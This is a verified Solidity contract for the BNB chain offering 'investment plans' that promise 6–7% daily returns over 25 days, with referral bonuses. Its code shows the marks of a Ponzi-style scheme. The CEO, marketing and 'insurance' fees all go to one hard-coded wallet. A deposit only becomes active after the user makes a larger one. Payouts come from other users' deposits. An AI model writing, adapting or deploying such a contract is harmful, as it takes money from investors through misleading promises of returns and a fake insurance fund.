/**
 *Submitted for verification at BscScan.com on 2023-01-02
*/

/**
 *Submitted for verification at BscScan.com on 2022-12-14
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract Test {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 0.01 ether;
    uint256 constant public INVEST_MAX_AMOUNT = 1000 ether; 
    uint256 constant public WITHDRAW_MIN_AMOUNT = 0.1 ether;
    uint256 constant public WITHDRAW_MAX_AMOUNT = 100 ether; 
    uint256 constant public MAX_DEPOSIT = 300;
    uint256 constant public INVEST_STEP = 0.01 ether;
    uint256 constant public MASTER_MIN_DEPOSIT = 7;
	uint256[] public REFERRAL_PERCENTS = [50, 20];
	uint256 constant public CEO_FEE = 100;
	uint256 constant public MARKETING_FEE = 30;
    uint256 constant public WITHDRAW_FEE = 50;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalInvested;
	uint256 public totalReferral;
	uint256 public totalInvestors;
	uint256 public insuranceFund;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
		uint256 checkpoint;
        bool isActive;
	}

	struct User {
		Deposit[] deposits;
		address referrer;
		uint256 checkpoint;
		uint256[2] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
		uint256 reserve;
	}

	mapping (address => User) internal users;

	uint256 public startDate;

	address payable public ceoWallet;
	address payable public marketinWallet;
    address payable public insuranceWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time);
	event Withdrawn(address indexed user, uint256 amount, uint256 time);
    event WithdrawRef(address indexed user, uint256 amount, uint256 time);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);


	constructor() {
        ceoWallet = payable(0x915C4E31a1b723B9704612A423C79610799d9461);
		marketinWallet = payable(0x915C4E31a1b723B9704612A423C79610799d9461);
        insuranceWallet = payable(0x915C4E31a1b723B9704612A423C79610799d9461);

		startDate = 1671541200; //Tue Dec 20 2022 13:00:00 GMT+0000

        plans.push(Plan(25, 60));
        plans.push(Plan(25, 70));
	}

	function invest(address referrer) public payable {
		require(block.timestamp > startDate, "contract does not launch yet");
		require(msg.value >= INVEST_MIN_AMOUNT && msg.value <= INVEST_MAX_AMOUNT, "Invalid deposit amount");
        uint8 plan = 0;
		User storage user = users[msg.sender];
        uint256 depositsLength = user.deposits.length;
        require(depositsLength < MAX_DEPOSIT, "max 300 deposit each address");
        if(depositsLength > 0){
            Deposit storage userLastDeposit = user.deposits[user.deposits.length.sub(1)];
            require(userLastDeposit.amount.add(INVEST_STEP) <= msg.value, "Deposit amount should be greater");
            userLastDeposit.isActive = true;
            if(depositsLength >= MASTER_MIN_DEPOSIT){
                plan = 1;
            }
        }
		uint256 ceo = msg.value.mul(CEO_FEE).div(PERCENTS_DIVIDER);
		uint256 mFee = msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
		ceoWallet.transfer(ceo);
		marketinWallet.transfer(mFee);
		emit FeePayed(msg.sender, ceo.add(mFee));


		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 ) { // && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 2; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 2; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					totalReferral = totalReferral.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			totalInvestors++;
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}
		
		bool withdrawStatus = depositsLength >= MAX_DEPOSIT.sub(1) ? true : false;

		user.deposits.push(Deposit(plan, msg.value, block.timestamp,  block.timestamp, withdrawStatus));

		totalInvested = totalInvested.add(msg.value);

		emit NewDeposit(msg.sender, plan, msg.value, block.timestamp);
	}

	function withdraw() public {
        require(block.timestamp > startDate, "contract does not launch yet");

		User storage user = users[msg.sender];
		require(user.checkpoint.add(TIME_STEP) < block.timestamp, "only once a day");

		uint256 totalAmount = _getUserDividends(msg.sender);
		if(user.reserve > 0){
			totalAmount = totalAmount.add(user.reserve);
			user.reserve = 0;
		}

        require(totalAmount >= WITHDRAW_MIN_AMOUNT, "Invalid amount");

		if(totalAmount > WITHDRAW_MAX_AMOUNT){
			user.reserve = totalAmount.sub(WITHDRAW_MAX_AMOUNT);
			totalAmount = WITHDRAW_MAX_AMOUNT;
		}
		

        uint256 wFee = totalAmount.mul(WITHDRAW_FEE).div(PERCENTS_DIVIDER);
		insuranceWallet.transfer(wFee);
        totalAmount = totalAmount.sub(wFee);
		insuranceFund = insuranceFund.add(wFee);
		emit FeePayed(msg.sender, wFee);

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
            revert("Not enough contract balance");
		}

		user.withdrawn = user.withdrawn.add(totalAmount);
		user.checkpoint = block.timestamp;

		payable(msg.sender).transfer(totalAmount);

		emit Withdrawn(msg.sender, totalAmount, block.timestamp);
	}

    function withdrawRef() public {
        require(block.timestamp > startDate, "contract does not launch yet");
		User storage user = users[msg.sender];
		
		uint256 totalAmount = getUserReferralBonus(msg.sender);
		require(totalAmount > 0, "User has no dividends");
        user.bonus = 0;
        payable(msg.sender).transfer(totalAmount);
        emit WithdrawRef(msg.sender, totalAmount, block.timestamp);
	}	    

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function _getUserDividends(address userAddress) internal returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if(user.deposits[i].isActive == true){
                uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			    if (user.deposits[i].checkpoint < finish) {
					uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.deposits[i].checkpoint ? user.deposits[i].start : user.deposits[i].checkpoint;
					uint256 to = finish < block.timestamp ? finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					}
					user.deposits[i].checkpoint = block.timestamp;
			    }
            }
		}

		return totalAmount;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if(user.deposits[i].isActive == true){
                uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			    if (user.deposits[i].checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.deposits[i].checkpoint ? user.deposits[i].start : user.deposits[i].checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				    if (from < to) {
					    totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				    }
			    }
            }
		}

		return totalAmount;
	}

    function getUserTotalDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.deposits[i].checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.deposits[i].checkpoint ? user.deposits[i].start : user.deposits[i].checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[2] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		User storage user = users[userAddress];
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress)).add(user.reserve);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish, bool isActive, uint256 checkpoint) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
        isActive = user.deposits[index].isActive;
        checkpoint = user.deposits[index].checkpoint;
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus, uint256 _totalInvestors, uint256 _insuranceFund) {
		return(totalInvested, totalReferral, totalInvestors, insuranceFund);
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals, uint256 _depositAmount) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress), getUserAmountOfDeposits(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}